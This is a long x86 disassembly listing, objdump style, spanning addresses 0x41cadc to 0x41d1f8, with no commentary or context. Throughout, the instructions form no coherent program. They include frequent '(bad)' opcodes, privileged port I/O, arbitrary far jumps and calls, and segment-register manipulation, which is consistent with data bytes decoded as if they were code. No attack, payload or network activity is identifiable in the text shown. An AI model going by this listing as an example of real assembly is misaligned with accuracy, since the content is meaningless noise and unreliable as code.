  41cadc:	outs   dx,DWORD PTR ds:[esi]
  41cadd:	and    eax,DWORD PTR [edi]
  41cadf:	and    al,BYTE PTR [esp+ecx*4-0x2f894948]
  41cae6:	(bad)  
  41cae7:	test   eax,0x42ba5612
  41caec:	xor    BYTE PTR [esi-0x3e],ah
  41caef:	add    ah,dl
  41caf1:	add    BYTE PTR [ecx-0x14],0xb8
  41caf5:	or     BYTE PTR [edx-0x1f],bl
  41caf8:	push   es
  41caf9:	sbb    edi,DWORD PTR [eax]
  41cafb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cafc:	gs sbb ebx,ebx
  41caff:	pushw  0xffeb
  41cb02:	add    eax,0xea847e31
  41cb07:	push   ss
  41cb08:	imul   edx,eax,0x31
  41cb0b:	loopne 0x41caca
  41cb0d:	mov    gs,WORD PTR [edx-0x317d6acc]
  41cb13:	test   al,0xd7
  41cb15:	push   0x8e7281d
  41cb1a:	push   ecx
  41cb1b:	inc    esi
  41cb1c:	out    dx,eax
  41cb1d:	ins    DWORD PTR es:[edi],dx
  41cb1e:	and    al,0x54
  41cb20:	shr    cl,0xa7
  41cb23:	arpl   WORD PTR [eax-0x5a8c993],di
  41cb29:	loopne 0x41cb7c
  41cb2b:	pop    eax
  41cb2c:	pop    ecx
  41cb2d:	in     al,0xcd
  41cb2f:	fwait
  41cb30:	inc    edx
  41cb31:	int    0xf5
  41cb33:	push   esp
  41cb34:	jle    0x41cba7
  41cb36:	out    dx,eax
  41cb37:	push   ecx
  41cb38:	push   esp
  41cb39:	(bad)  [esi+0x6a2c049c]
  41cb3f:	dec    esp
  41cb40:	(bad)  
  41cb41:	daa    
  41cb42:	ret    0x5cb5
  41cb45:	push   es
  41cb46:	loop   0x41cb25
  41cb48:	cs (bad) 
  41cb4a:	sbb    ecx,DWORD PTR [eax-0x358e3bce]
  41cb50:	outs   dx,BYTE PTR ds:[esi]
  41cb51:	mov    ecx,DWORD PTR [edx+0x20]
  41cb54:	sbb    DWORD PTR gs:[esi],0x4b
  41cb58:	add    al,0x82
  41cb5a:	mov    eax,0xd22567bd
  41cb5f:	sbb    al,0x71
  41cb61:	jmp    0x1da4522a
  41cb66:	popf   
  41cb67:	pop    es
  41cb68:	repz adc al,0x7e
  41cb6b:	mov    WORD PTR [esi-0x7b],gs
  41cb6e:	push   0x91f8c176
  41cb73:	lock add dl,BYTE PTR [eax-0x64]
  41cb77:	push   esi
  41cb78:	test   edx,ecx
  41cb7a:	cmc    
  41cb7b:	and    esi,ebp
  41cb7d:	stc    
  41cb7e:	pop    ss
  41cb7f:	sbb    ah,BYTE PTR [edx+0x1c28b555]
  41cb85:	add    DWORD PTR [esi+0x7d71fe6d],ebp
  41cb8b:	loopne 0x41cb22
  41cb8d:	in     al,dx
  41cb8e:	adc    DWORD PTR [ebp+0x331407c1],0xd2bcec8a
  41cb98:	sbb    ebx,ebp
  41cb9a:	fwait
  41cb9b:	pop    ss
  41cb9c:	adc    al,0x8a
  41cb9e:	inc    edx
  41cb9f:	push   0x22
  41cba1:	sbb    al,BYTE PTR [esi+0x1af2e442]
  41cba7:	aas    
  41cba8:	(bad)  
  41cba9:	aaa    
  41cbaa:	retf   
  41cbab:	mov    bh,BYTE PTR [eax+0x5e]
  41cbae:	dec    ebx
  41cbaf:	test   BYTE PTR [edi+0x42],ah
  41cbb2:	add    dl,BYTE PTR [ebx+0x3e]
  41cbb5:	repnz (bad) 
  41cbb7:	in     al,dx
  41cbb8:	mov    BYTE PTR [esi+ebp*1-0x4759e25c],bl
  41cbbf:	fadd   DWORD PTR [edi]
  41cbc1:	nop
  41cbc2:	sbb    BYTE PTR [edi],ch
  41cbc4:	leave  
  41cbc5:	cmp    ecx,DWORD PTR [ebp+0x7f3160c3]
  41cbcb:	pop    esp
  41cbcc:	sti    
  41cbcd:	mov    cl,0xd2
  41cbcf:	jecxz  0x41cba3
  41cbd1:	shl    eax,cl
  41cbd3:	xor    BYTE PTR [ebx+0x27],bl
  41cbd6:	pop    eax
  41cbd7:	aad    0x50
  41cbd9:	sahf   
  41cbda:	hlt    
  41cbdb:	je     0x41cbde
  41cbdd:	inc    edi
  41cbde:	call   0xab0c:0xa78b3dc4
  41cbe5:	sbb    eax,0x9e31a6cd
  41cbea:	cwde   
  41cbeb:	inc    esp
  41cbec:	shr    DWORD PTR [esi-0x6ce670cc],0x5e
  41cbf3:	and    esp,DWORD PTR [ebx+0x54]
  41cbf6:	pop    edi
  41cbf7:	icebp  
  41cbf8:	and    al,0x64
  41cbfa:	mov    WORD PTR [edx-0x5c],ss
  41cbfd:	push   ebx
  41cbfe:	adc    ebx,DWORD PTR [ecx]
  41cc00:	jle    0x41cc6e
  41cc02:	nop
  41cc03:	pop    edx
  41cc04:	int3   
  41cc05:	jnp    0x41cbdf
  41cc07:	popf   
  41cc08:	in     al,0x62
  41cc0a:	adc    dh,BYTE PTR [ecx+0x31]
  41cc0d:	ds mov al,0xee
  41cc10:	cli    
  41cc11:	mov    eax,ds:0xcca64650
  41cc16:	mov    WORD PTR [ecx],cs
  41cc18:	sbb    al,BYTE PTR ds:0x947e6a65
  41cc1e:	(bad)  
  41cc1f:	push   0x2d147ed5
  41cc24:	je     0x41cc32
  41cc26:	loop   0x41cc95
  41cc28:	std    
  41cc29:	push   ecx
  41cc2a:	dec    ecx
  41cc2b:	and    DWORD PTR [ebx*4-0x1c35746d],edi
  41cc32:	sbb    eax,0xc03f097a
  41cc37:	mov    edi,0xb1211766
  41cc3c:	jp     0x41ccba
  41cc3e:	xchg   ecx,eax
  41cc3f:	int3   
  41cc40:	pop    esp
  41cc41:	jmp    0xc15a7350
  41cc46:	sbb    al,0x90
  41cc48:	cli    
  41cc49:	pop    ds
  41cc4a:	mov    bh,BYTE PTR [eax-0x7cc82c20]
  41cc50:	sbb    BYTE PTR [eax+0x37],dh
  41cc53:	sbb    DWORD PTR [edx+0x74],edi
  41cc56:	jne    0x41cbf4
  41cc58:	cmp    eax,0x92da1778
  41cc5d:	fs pop ecx
  41cc5f:	adc    BYTE PTR [edi+0x43],bh
  41cc62:	mov    DWORD PTR [eax-0x14],ecx
  41cc65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc66:	jge    0x41cc6d
  41cc68:	les    ecx,FWORD PTR [ebx*2+0x7b465d17]
  41cc6f:	in     eax,dx
  41cc70:	push   edx
  41cc71:	bound  ebp,QWORD PTR [eax]
  41cc73:	push   ebp
  41cc74:	int3   
  41cc75:	jns    0x41cc79
  41cc77:	fist   WORD PTR [ebp+0x1d]
  41cc7a:	adc    eax,0x1652ddf3
  41cc7f:	inc    edx
  41cc80:	push   edi
  41cc81:	stos   BYTE PTR es:[edi],al
  41cc82:	cli    
  41cc83:	xlat   BYTE PTR ds:[ebx]
  41cc84:	es das 
  41cc86:	mov    cl,0x97
  41cc88:	mov    esi,0x275a39f9
  41cc8d:	out    0xc3,al
  41cc8f:	jmp    0x41cc4b
  41cc91:	jle    0x41cd01
  41cc93:	fucom  st(4)
  41cc95:	jecxz  0x41cc45
  41cc97:	adc    edi,ebx
  41cc99:	fmul   DWORD PTR [esi-0x1731e3ec]
  41cc9f:	xchg   edi,eax
  41cca0:	jl     0x41cc87
  41cca2:	sbb    eax,0x44eb0a5e
  41cca7:	lods   al,BYTE PTR ds:[esi]
  41cca8:	shl    edx,cl
  41ccaa:	int3   
  41ccab:	push   edi
  41ccac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ccad:	dec    edx
  41ccae:	dec    ecx
  41ccaf:	jbe    0x41cd22
  41ccb1:	sub    ebp,DWORD PTR [edx+eiz*8]
  41ccb4:	or     bl,ah
  41ccb6:	cmp    esp,DWORD PTR [ebx-0x69]
  41ccb9:	and    BYTE PTR [ebx+0x13eda4bf],ah
  41ccbf:	jecxz  0x41cd04
  41ccc1:	(bad)  
  41ccc2:	cmp    al,0xd3
  41ccc4:	dec    ebp
  41ccc5:	adc    BYTE PTR [ebp-0x77],ah
  41ccc8:	pop    edi
  41ccc9:	lods   eax,DWORD PTR ds:[esi]
  41ccca:	cmp    DWORD PTR [ebp+0x24],edi
  41cccd:	sti    
  41ccce:	outs   dx,DWORD PTR ds:[esi]
  41cccf:	pop    ebp
  41ccd0:	xchg   esi,eax
  41ccd1:	xchg   ecx,eax
  41ccd2:	xchg   ebp,eax
  41ccd3:	cli    
  41ccd4:	lock dec eax
  41ccd6:	ss fist WORD PTR ss:[edi]
  41ccda:	nop
  41ccdb:	loopne 0x41cc92
  41ccdd:	push   ds
  41ccde:	inc    edx
  41ccdf:	pushf  
  41cce0:	push   0xe9298734
  41cce5:	pop    ss
  41cce6:	(bad)  
  41cce8:	(bad)  
  41ccea:	pop    esp
  41cceb:	jno    0x41cd2e
  41cced:	retf   
  41ccee:	push   edi
  41ccef:	sar    BYTE PTR [ebx-0x75],0x53
  41ccf3:	test   DWORD PTR [esi+0x14624089],edi
  41ccf9:	(bad)  
  41ccfa:	xchg   edi,eax
  41ccfb:	popf   
  41ccfc:	push   ecx
  41ccfd:	cmp    al,0x20
  41ccff:	loop   0x41cce9
  41cd01:	sbb    al,0x9
  41cd03:	and    edi,DWORD PTR [edx+0x3293708d]
  41cd09:	loopne 0x41cd4c
  41cd0b:	aas    
  41cd0c:	gs pushf 
  41cd0e:	mov    edi,0xe8a3ef2
  41cd13:	outs   dx,DWORD PTR ds:[esi]
  41cd14:	xor    eax,0x3beb5881
  41cd19:	dec    ecx
  41cd1a:	cmc    
  41cd1b:	push   es
  41cd1c:	or     al,0x7c
  41cd1e:	pop    eax
  41cd1f:	loope  0x41cd2c
  41cd21:	out    dx,eax
  41cd22:	inc    ecx
  41cd23:	mov    esi,0x1a42b987
  41cd28:	and    al,0x9
  41cd2a:	pop    ebx
  41cd2b:	adc    DWORD PTR [ebp-0x4b47194b],eax
  41cd31:	jle    0x41cd87
  41cd33:	test   al,0x30
  41cd35:	or     esi,DWORD PTR [ebp-0x5bfef52b]
  41cd3b:	out    0x91,al
  41cd3d:	adc    al,0x23
  41cd3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd40:	ins    DWORD PTR es:[edi],dx
  41cd41:	fst    QWORD PTR [edx-0x7a]
  41cd44:	fxch   st(7)
  41cd46:	leave  
  41cd47:	(bad)  
  41cd48:	idiv   ah
  41cd4a:	xor    ebp,edx
  41cd4c:	clc    
  41cd4d:	cs pop esp
  41cd4f:	daa    
  41cd50:	jle    0x41ccf4
  41cd52:	xor    cl,BYTE PTR [esi]
  41cd54:	int    0x2e
  41cd56:	mov    cl,0xa3
  41cd58:	or     ecx,DWORD PTR [bx+0x20]
  41cd5c:	daa    
  41cd5d:	mov    eax,ds:0xad8af182
  41cd62:	cdq    
  41cd63:	jno    0x41cd37
  41cd65:	add    ah,BYTE PTR [edx-0x57]
  41cd68:	out    dx,eax
  41cd69:	mov    esp,0xe525531
  41cd6e:	xor    DWORD PTR [ebp-0x5c],edx
  41cd71:	mov    bl,0xcc
  41cd73:	lods   eax,DWORD PTR ds:[esi]
  41cd74:	or     al,0x8d
  41cd76:	mov    edx,0xef442d0a
  41cd7b:	mov    ds:0xd30446aa,eax
  41cd80:	cmp    edi,0x56
  41cd83:	pop    edx
  41cd84:	mov    ds:0xcfacc482,eax
  41cd89:	mov    edi,0xc2f718fe
  41cd8e:	out    0xd9,al
  41cd90:	or     edx,DWORD PTR [edi-0x5a]
  41cd93:	outs   dx,DWORD PTR ds:[esi]
  41cd94:	sbb    BYTE PTR cs:[ebx-0x521f98cd],bl
  41cd9b:	lods   eax,DWORD PTR ds:[esi]
  41cd9c:	popa   
  41cd9d:	add    BYTE PTR [ecx-0x2e5e8ae3],0x1e
  41cda4:	mov    esi,DWORD PTR [ecx+0x4]
  41cda7:	push   edx
  41cda8:	rol    BYTE PTR [ebp+eiz*1+0x441ec287],cl
  41cdaf:	(bad)  
  41cdb0:	js     0x41cd5d
  41cdb2:	xchg   ebx,eax
  41cdb3:	subps  xmm4,XMMWORD PTR [esi]
  41cdb6:	and    eax,0x93822521
  41cdbb:	or     ah,BYTE PTR [edi]
  41cdbd:	jp     0x41ce01
  41cdbf:	xor    eax,0xb76a09de
  41cdc4:	xchg   esi,eax
  41cdc5:	(bad)  
  41cdc7:	inc    edx
  41cdc8:	jns    0x41cde4
  41cdca:	sub    edi,ebp
  41cdcc:	adc    al,0x6d
  41cdce:	arpl   WORD PTR [ebx+0x78],di
  41cdd1:	pop    ss
  41cdd2:	cmc    
  41cdd3:	scas   al,BYTE PTR es:[edi]
  41cdd4:	jl     0x41cd77
  41cdd6:	enter  0x9ab5,0x74
  41cdda:	(bad)
  41cddf:	rol    DWORD PTR [ebx-0x7d7c021],0x62
  41cde6:	out    0x9d,eax
  41cde8:	ins    BYTE PTR es:[edi],dx
  41cde9:	cmp    DWORD PTR [edx-0x31],esi
  41cdec:	adc    BYTE PTR [edi-0x658ca172],al
  41cdf2:	push   edx
  41cdf3:	mov    ch,0xfd
  41cdf5:	fs jge 0x41ce77
  41cdf8:	xlat   BYTE PTR ds:[ebx]
  41cdf9:	inc    ebx
  41cdfa:	(bad)  
  41cdfb:	lea    eax,[esi]
  41cdfd:	pusha  
  41cdfe:	loop   0x41cdfa
  41ce00:	rcr    DWORD PTR [ebp-0x48e0f9d9],cl
  41ce06:	enter  0xa14f,0x1f
  41ce0a:	sbb    al,0x1d
  41ce0c:	retf   0xb0ba
  41ce0f:	jnp    0x41cda4
  41ce11:	test   DWORD PTR [ecx+0x4c],ecx
  41ce14:	adc    ch,dl
  41ce16:	mov    dl,0x1d
  41ce18:	rol    DWORD PTR [ebx+0x11],0xb9
  41ce1c:	dec    ecx
  41ce1d:	jns    0x41ce23
  41ce1f:	lahf   
  41ce20:	popf   
  41ce21:	push   eax
  41ce22:	cld    
  41ce23:	mov    bh,0xb2
  41ce25:	addr16 cdq 
  41ce27:	jbe    0x41ce65
  41ce29:	fsubr  DWORD PTR [edx]
  41ce2b:	cld    
  41ce2c:	sub    DWORD PTR gs:[ebp+0x3cffefa3],ebp
  41ce33:	push   ebx
  41ce34:	push   ecx
  41ce35:	dec    edx
  41ce36:	sbb    dl,BYTE PTR [ebp+0x3466605]
  41ce3c:	mov    ch,0xf3
  41ce3e:	addr16 test al,0x12
  41ce41:	lods   eax,DWORD PTR ds:[esi]
  41ce42:	mov    ch,0x84
  41ce44:	mov    BYTE PTR [esi],dl
  41ce46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce47:	nop
  41ce48:	lock loope 0x41ce15
  41ce4b:	fsub   QWORD PTR [edi]
  41ce4d:	loope  0x41ce16
  41ce4f:	push   eax
  41ce50:	push   ecx
  41ce51:	iret   
  41ce52:	rcl    DWORD PTR [esi],1
  41ce54:	or     BYTE PTR [esi-0x693b897d],ch
  41ce5a:	push   esi
  41ce5b:	test   bl,dl
  41ce5d:	fsub   DWORD PTR ds:0x214869b7
  41ce63:	pop    esp
  41ce64:	jp     0x41ce82
  41ce66:	out    dx,al
  41ce67:	out    0xe5,al
  41ce69:	or     ebp,DWORD PTR [ecx]
  41ce6b:	add    al,0x3e
  41ce6d:	addr16 loopne 0x41cee0
  41ce70:	inc    ebp
  41ce71:	test   DWORD PTR [edi+0x2c],edx
  41ce74:	dec    eax
  41ce75:	xchg   DWORD PTR [edx+ebx*2+0x6f],edi
  41ce79:	add    BYTE PTR [edx-0x21],ch
  41ce7c:	call   0x7584363b
  41ce81:	cmp    al,0x40
  41ce83:	xor    ebx,DWORD PTR [ebp+0x1fdab0c7]
  41ce89:	sbb    BYTE PTR [ebp-0x1a],ah
  41ce8c:	aas    
  41ce8d:	mov    ds:0x6a686eea,eax
  41ce92:	call   0x1198:0x4da4c511
  41ce99:	pop    ecx
  41ce9a:	fcomi  st,st(7)
  41ce9c:	jbe    0x41cee6
  41ce9e:	xchg   esi,eax
  41ce9f:	pop    edi
  41cea0:	iret   
  41cea1:	lock pop eax
  41cea3:	pop    ecx
  41cea4:	imul   eax,DWORD PTR [edi],0x3d
  41cea7:	faddp  st(4),st
  41cea9:	lock xchg edx,eax
  41ceab:	mov    edx,0xa12cd974
  41ceb0:	mul    DWORD PTR [ebx+0x74be8f65]
  41ceb6:	jg     0x41ce7f
  41ceb8:	push   edx
  41ceb9:	mov    ecx,DWORD PTR ds:0x2ebea850
  41cebf:	rcr    DWORD PTR [ebx+0x4d4d7e86],cl
  41cec5:	popa   
  41cec6:	xchg   esi,eax
  41cec7:	shr    edi,cl
  41cec9:	sub    ebp,DWORD PTR [esi+0x3c1cf2f9]
  41cecf:	rcr    DWORD PTR [eax+0x38],cl
  41ced2:	gs js  0x41ce90
  41ced5:	xor    DWORD PTR [esi+ebp*2],edi
  41ced8:	loope  0x41ce66
  41ceda:	aad    0xb4
  41cedc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cedd:	loopne 0x41ce71
  41cedf:	xchg   edx,eax
  41cee0:	and    ch,cl
  41cee2:	out    dx,al
  41cee3:	scas   al,BYTE PTR es:[edi]
  41cee4:	xchg   ecx,eax
  41cee5:	sbb    al,0x81
  41cee7:	or     cl,BYTE PTR [ebx-0x79f801f2]
  41ceed:	xchg   edx,eax
  41ceee:	push   ebp
  41ceef:	push   ebx
  41cef0:	idiv   DWORD PTR [esi+0x1a75cb68]
  41cef6:	mov    eax,0x6dcbeb61
  41cefb:	test   BYTE PTR [esi+0x62eb6d45],bh
  41cf01:	cmp    eax,DWORD PTR [ecx-0xe]
  41cf04:	adc    bh,BYTE PTR ds:0x8e56e181
  41cf0a:	jno    0x41cf03
  41cf0c:	jno    0x41cf06
  41cf0e:	loop   0x41ceb8
  41cf10:	jge    0x41cefc
  41cf12:	push   eax
  41cf13:	das    
  41cf14:	push   edx
  41cf15:	test   DWORD PTR [esi*4-0x7c30f689],ecx
  41cf1c:	and    bh,BYTE PTR [edx]
  41cf1e:	mov    cl,0x27
  41cf20:	xchg   esp,eax
  41cf21:	push   ecx
  41cf22:	mov    WORD PTR [edx+0x11],fs
  41cf25:	dec    ebx
  41cf26:	push   ds
  41cf27:	mov    esi,0xd778220e
  41cf2c:	jnp    0x41cf58
  41cf2e:	in     eax,0xa3
  41cf30:	daa    
  41cf31:	mov    esi,0xb089c2ed
  41cf36:	je     0x41cfaf
  41cf38:	and    eax,0x8e642bef
  41cf3d:	xchg   DWORD PTR [ebx+0x50],eax
  41cf40:	pop    ecx
  41cf41:	imul   ebx,DWORD PTR [eax+0x41],0xffffffa5
  41cf45:	add    DWORD PTR [ebx-0x6c],ecx
  41cf48:	mov    DWORD PTR ds:0x5941779b,ebp
  41cf4e:	and    al,bh
  41cf50:	hlt    
  41cf51:	push   es
  41cf52:	loope  0x41cef7
  41cf54:	jne    0x41cf4a
  41cf56:	test   DWORD PTR [ebp-0xacbba74],ebp
  41cf5c:	scas   eax,DWORD PTR es:[edi]
  41cf5d:	xchg   ebx,eax
  41cf5e:	fucom  st(6)
  41cf60:	or     al,0xcf
  41cf62:	fucomip st,st(1)
  41cf64:	fmul   QWORD PTR [esi]
  41cf66:	sbb    DWORD PTR [eax-0x2a3988b2],ebx
  41cf6c:	jno    0x41cf2b
  41cf6e:	push   eax
  41cf6f:	mov    ds:0xdddeddf7,al
  41cf74:	jle    0x41cf0f
  41cf76:	jmp    0x41cf31
  41cf78:	cmp    eax,0x95ed146d
  41cf7d:	lods   al,BYTE PTR ds:[esi]
  41cf7e:	aad    0x95
  41cf80:	je     0x41cf54
  41cf82:	mov    ch,0x7
  41cf84:	loop   0x41cf70
  41cf86:	das    
  41cf87:	ror    DWORD PTR [eax+eax*2+0x41],1
  41cf8b:	test   al,0xb9
  41cf8d:	sti    
  41cf8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf8f:	pop    ecx
  41cf90:	ja     0x41cfb7
  41cf92:	mov    al,ds:0xc9d5412b
  41cf97:	cmp    esi,0x5f
  41cf9a:	iret   
  41cf9b:	mov    esp,DWORD PTR [edx-0x1eb954ea]
  41cfa1:	or     ebp,0xffffffec
  41cfa4:	sub    eax,0x46a96dc5
  41cfa9:	adc    DWORD PTR [edx],ebp
  41cfab:	inc    ecx
  41cfac:	pop    esi
  41cfad:	out    0xb9,al
  41cfaf:	into   
  41cfb0:	jno    0x41d023
  41cfb2:	ret    0x815c
  41cfb5:	add    eax,0x762eb545
  41cfba:	loop   0x41cff2
  41cfbc:	push   0xf
  41cfbe:	pop    ss
  41cfbf:	push   cs
  41cfc0:	pushf  
  41cfc1:	push   ebp
  41cfc2:	adc    ch,BYTE PTR [eax]
  41cfc4:	mov    cs,WORD PTR [edx+0xe]
  41cfc7:	sub    dl,BYTE PTR [ebx-0x57]
  41cfca:	dec    esi
  41cfcb:	iret   
  41cfcc:	jecxz  0x41cfac
  41cfce:	xor    edi,edi
  41cfd0:	adc    al,0x7b
  41cfd2:	retf   
  41cfd3:	mov    esp,0xb855a11f
  41cfd8:	in     eax,0x13
  41cfda:	fdiv   st(1),st
  41cfdc:	sub    esi,DWORD PTR [ecx-0x86cb71a]
  41cfe2:	and    bl,BYTE PTR [eax+0x24]
  41cfe5:	in     eax,dx
  41cfe6:	push   cs
  41cfe7:	or     eax,0x13739c25
  41cfec:	fst    st(3)
  41cfee:	pop    esp
  41cfef:	push   ds
  41cff0:	in     al,0xa7
  41cff2:	inc    esp
  41cff3:	cmp    al,0xfc
  41cff5:	aas    
  41cff6:	add    eax,0xbf8455f0
  41cffb:	aaa    
  41cffc:	imul   edi,edx,0x72
  41cfff:	jle    0x41d021
  41d001:	ss dec eax
  41d003:	mov    bl,0x76
  41d005:	jo     0x41d027
  41d007:	inc    edi
  41d008:	int3   
  41d009:	mov    edi,0xc37f71df
  41d00e:	xchg   esp,eax
  41d00f:	dec    ebp
  41d010:	mov    edx,ss
  41d012:	xchg   ebp,eax
  41d013:	fst    DWORD PTR [esp+esi*1-0x53]
  41d017:	push   0x29
  41d019:	dec    esp
  41d01a:	sbb    eax,0xaf9d4647
  41d01f:	mov    al,0xc6
  41d021:	and    dh,BYTE PTR [edi+0x4489faa1]
  41d027:	idiv   dl
  41d029:	dec    ecx
  41d02a:	add    ebp,edx
  41d02c:	mov    ds:0x2483b854,eax
  41d031:	jnp    0x41d08f
  41d033:	out    0x8f,eax
  41d035:	inc    ecx
  41d036:	retf   0x8f53
  41d039:	dec    edi
  41d03a:	sti    
  41d03b:	mov    esi,0xa08d73eb
  41d040:	inc    eax
  41d041:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d042:	in     al,dx
  41d043:	fisubr WORD PTR [ebx]
  41d045:	and    al,0xc2
  41d047:	(bad)  
  41d048:	(bad)
  41d04b:	adc    DWORD PTR [ebx],0xaf177a5f
  41d051:	inc    edx
  41d052:	pushf  
  41d053:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d054:	add    dl,BYTE PTR [esi]
  41d056:	clc    
  41d057:	and    cl,BYTE PTR [edx+0x2d]
  41d05a:	add    al,0x53
  41d05c:	adc    DWORD PTR [eax+0xc],edi
  41d05f:	js     0x41d03f
  41d061:	xchg   esi,eax
  41d062:	(bad)  
  41d063:	xchg   ebp,eax
  41d064:	enter  0x1e0f,0x37
  41d068:	and    dl,BYTE PTR [ebx]
  41d06a:	push   ss
  41d06b:	xchg   edi,eax
  41d06c:	sub    al,0x33
  41d06e:	clc    
  41d06f:	adc    DWORD PTR [eax-0x27],eax
  41d072:	push   cs
  41d073:	jmp    0x67990798
  41d078:	mov    ch,0x64
  41d07a:	adc    al,0x96
  41d07c:	sbb    eax,0xdf5d1e38
  41d081:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d082:	ror    BYTE PTR [ebx+0x72],1
  41d085:	jmp    0xee70:0x333752ec
  41d08c:	mov    edx,0x52b8427c
  41d091:	cli    
  41d092:	sbb    edx,DWORD PTR [ebx+edi*8-0x65]
  41d096:	or     al,0x2f
  41d098:	fsub   DWORD PTR [ebp-0x3bd58c2b]
  41d09e:	adc    ebp,DWORD PTR [ebx+0xd351aaa]
  41d0a4:	repnz push 0x5d
  41d0a7:	xchg   ebp,eax
  41d0a8:	ss dec esi
  41d0aa:	ja     0x41d0ab
  41d0ac:	imul   ebx,DWORD PTR [ebp+0x3a],0xffffffe1
  41d0b0:	or     eax,0x6b14b2c4
  41d0b5:	jne    0x41d085
  41d0b7:	int    0xed
  41d0b9:	sub    al,0x54
  41d0bb:	gs stc 
  41d0bd:	mov    eax,0xfe3e86d
  41d0c2:	jbe    0x41d099
  41d0c4:	cli    
  41d0c5:	pop    esp
  41d0c6:	aaa    
  41d0c7:	cdq    
  41d0c8:	loopne 0x41d05b
  41d0ca:	(bad)  
  41d0cb:	fisttp WORD PTR [esi-0x3ec62013]
  41d0d1:	out    dx,al
  41d0d2:	clc    
  41d0d3:	mov    bl,0xd4
  41d0d5:	stos   BYTE PTR es:[edi],al
  41d0d6:	fwait
  41d0d7:	je     0x41d149
  41d0d9:	mov    edx,0x5cb6fcfb
  41d0de:	and    eax,0x2e11c359
  41d0e3:	ja     0x41d0f1
  41d0e5:	mov    al,0xe8
  41d0e7:	repnz mov esi,0x626b1f68
  41d0ed:	pop    ds
  41d0ee:	clc    
  41d0ef:	repz mov ds:0xf5ee16e3,eax
  41d0f5:	mov    esi,0xaa62f31b
  41d0fa:	mov    esp,0xda9d0e3a
  41d0ff:	pop    edx
  41d100:	cmp    eax,0xbc66d2f3
  41d105:	pop    ebp
  41d106:	pop    ebp
  41d107:	mov    edi,0x34db1b1a
  41d10c:	cmp    dh,BYTE PTR [eax]
  41d10e:	sbb    al,0xe
  41d110:	loope  0x41d15a
  41d112:	neg    BYTE PTR [eax]
  41d114:	nop
  41d115:	in     al,dx
  41d116:	xchg   DWORD PTR [ebx],esi
  41d118:	retf   0x4ee2
  41d11b:	outs   dx,BYTE PTR ds:[esi]
  41d11c:	or     ch,BYTE PTR ds:0x14c5e7c0
  41d122:	inc    edi
  41d123:	in     eax,dx
  41d124:	mov    al,ds:0xb6e87218
  41d129:	xor    eax,0x23f1730a
  41d12e:	test   al,0x7c
  41d130:	in     eax,0x62
  41d132:	into   
  41d133:	aaa    
  41d134:	adc    al,0xfc
  41d136:	sbb    esi,edi
  41d138:	rol    DWORD PTR [eax],0xbc
  41d13b:	mov    bl,BYTE PTR [eax+0x69]
  41d13e:	gs sti 
  41d140:	lahf   
  41d141:	imul   ebx,DWORD PTR [eax],0xfffffff5
  41d144:	(bad)  
  41d145:	ins    BYTE PTR es:[edi],dx
  41d146:	arpl   WORD PTR [ecx],si
  41d148:	outs   dx,BYTE PTR ds:[esi]
  41d149:	ror    cl,cl
  41d14b:	mov    edx,0x50f03816
  41d150:	xchg   edx,eax
  41d151:	pop    edx
  41d152:	ja     0x41d11b
  41d154:	and    eax,0x7ade770f
  41d159:	xor    DWORD PTR [esi],edi
  41d15b:	addr16 dec esp
  41d15d:	sub    eax,0x692ac8cf
  41d162:	lods   al,BYTE PTR ds:[esi]
  41d163:	mov    WORD PTR [esi+edi*8-0x4a],cs
  41d167:	cmp    DWORD PTR [ebp-0xd],esi
  41d16a:	out    dx,eax
  41d16b:	jl     0x41d0f9
  41d16d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d16e:	stos   DWORD PTR es:[edi],eax
  41d16f:	jg     0x41d184
  41d171:	loop   0x41d126
  41d173:	mov    ebx,DWORD PTR [edi+0x2b977dd8]
  41d179:	test   BYTE PTR [ebp+0x612401c7],bl
  41d17f:	pop    ds
  41d180:	mov    esi,0x82132405
  41d185:	mov    ebx,0x1dc1e403
  41d18a:	jno    0x41d1aa
  41d18c:	push   cs
  41d18d:	cld    
  41d18e:	fidiv  DWORD PTR [edx+0x187ff8db]
  41d194:	mov    ds:0x2915b0db,al
  41d199:	push   edi
  41d19a:	jl     0x41d185
  41d19c:	icebp  
  41d19d:	push   es
  41d19e:	push   edx
  41d19f:	pop    esp
  41d1a0:	push   0x42
  41d1a2:	stos   DWORD PTR es:[edi],eax
  41d1a3:	lea    ebp,[esi]
  41d1a5:	and    al,0x16
  41d1a7:	push   ds
  41d1a8:	sub    eax,DWORD PTR [esi+ebp*8]
  41d1ab:	fcom   DWORD PTR [ecx-0x40]
  41d1ae:	add    ecx,edx
  41d1b0:	mov    ds:0x70e670ae,eax
  41d1b5:	jl     0x41d236
  41d1b7:	cmp    DWORD PTR [eax-0x5],ebx
  41d1ba:	xor    eax,0xd84eb077
  41d1bf:	cwde   
  41d1c0:	push   edi
  41d1c1:	pop    eax
  41d1c2:	sub    edx,esi
  41d1c4:	pop    es
  41d1c5:	and    ecx,DWORD PTR [ecx+0xd]
  41d1c8:	outs   dx,BYTE PTR ds:[esi]
  41d1c9:	lods   eax,DWORD PTR ds:[esi]
  41d1ca:	push   ecx
  41d1cb:	pushf  
  41d1cc:	xor    BYTE PTR [ebx],dl
  41d1ce:	fistp  DWORD PTR [edx+0x2f]
  41d1d1:	mov    ch,0xaf
  41d1d3:	inc    edx
  41d1d4:	cwde   
  41d1d5:	add    al,0x1f
  41d1d7:	push   edi
  41d1d8:	mov    ebp,0x787d720a
  41d1dd:	fsubrp st(4),st
  41d1df:	push   es
  41d1e0:	stos   BYTE PTR es:[edi],al
  41d1e1:	inc    ecx
  41d1e2:	jae    0x41d258
  41d1e4:	mov    eax,0x90bf1a37
  41d1e9:	push   esp
  41d1ea:	lahf   
  41d1eb:	in     eax,0xbc
  41d1ed:	jb     0x41d20a
  41d1ef:	push   ss
  41d1f0:	mov    esp,DWORD PTR [ecx+0x35]
  41d1f3:	xchg   edx,eax
  41d1f4:	or     esp,DWORD PTR [ecx+ebx*2-0x6b]
  41d1f8:	mov    esp,0x5667565d
